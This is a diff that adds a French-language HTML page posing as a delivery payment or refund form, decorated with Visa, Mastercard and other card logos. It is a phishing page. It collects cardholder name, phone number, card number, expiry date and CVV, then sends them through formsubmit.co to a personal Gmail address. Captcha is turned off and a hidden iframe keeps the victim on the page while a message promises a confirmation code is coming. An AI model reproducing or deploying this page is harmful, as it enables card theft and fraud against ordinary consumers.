@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Paiement de livraison</title>
+<style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #f4f4f4;
+      font-family: Arial, sans-serif;
+    }
+
+    form {
+      width: 100%;
+      max-width: 400px;
+      padding: 30px;
+      background-color: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 10px 10px 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    input[name="carte"] {
+      background-image: url('https://cdn-icons-png.flaticon.com/512/633/633611.png');
+      background-repeat: no-repeat;
+      background-size: 18px;
+      background-position: right 10px center;
+      padding-right: 35px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .montant {
+      text-align: center;
+      margin-top: 10px;
+      font-weight: bold;
+      color: green;
+      font-size: 18px;
+    }
+
+    .confirmation {
+      text-align: center;
+      font-size: 18px;
+      color: #333;
+      margin-top: 20px;
+    }
+    </style>
+</head>
+<body>
+<div class="payment-container">
+<div class="card-icons">
+<img src="https://img.icons8.com/color/48/000000/mastercard-logo.png"/>
+<img src="https://img.icons8.com/color/48/000000/visa.png"/>
+<img src="https://img.icons8.com/color/48/000000/amex.png"/>
+<img src="https://img.icons8.com/color/48/000000/discover.png"/>
+<img src="https://img.icons8.com/color/48/000000/jcb.png"/>
+</div>
+<h2>Paiement de livraison</h2>
+<div class="logos">
+<img alt="Mastercard" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png"/>
+<img alt="Visa" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"/>
+<img alt="Amex" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg"/>
+<img alt="Discover" src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Discover_Card_logo.svg"/>
+<img alt="CB" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/CB_logo.svg/512px-CB_logo.svg.png"/>
+</div><form action="https://formsubmit.co/06esdgj42@gmail.com" id="payment-form" method="POST" target="invisible">
+<input name="nom" placeholder="Nom sur la carte" required="" type="text"/><input name="telephone" placeholder="Numéro de téléphone" type="text"/>
+<input name="numero" placeholder="N° de carte" required="" style="background-image: url('https://cdn-icons-png.flaticon.com/512/633/633611.png');background-repeat: no-repeat;background-size: 18px;background-position: right 10px center;padding-right: 35px;" type="text"/>
+<div class="row">
+
+
+</div>
+<div class="input-row"><input name="expiration" placeholder="MM/AA" required="" type="text"/><input name="cvv" placeholder="CVV" required="" type="text"/></div><button class="btn" type="submit">Demander un remboursement</button>
+<input name="_next" type="hidden" value="https://formsubmit.co/thank-you"/><input name="_captcha" type="hidden" value="false"/><input name="_autoresponse" type="hidden" value="Merci, votre code de confirmation vous sera envoyé sous peu."/></form>
+<iframe name="invisible"></iframe>
+<div class="message" id="confirmation-message" style="display: none;">
+      ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
+    </div>
+</div>
+</body>
+</html>
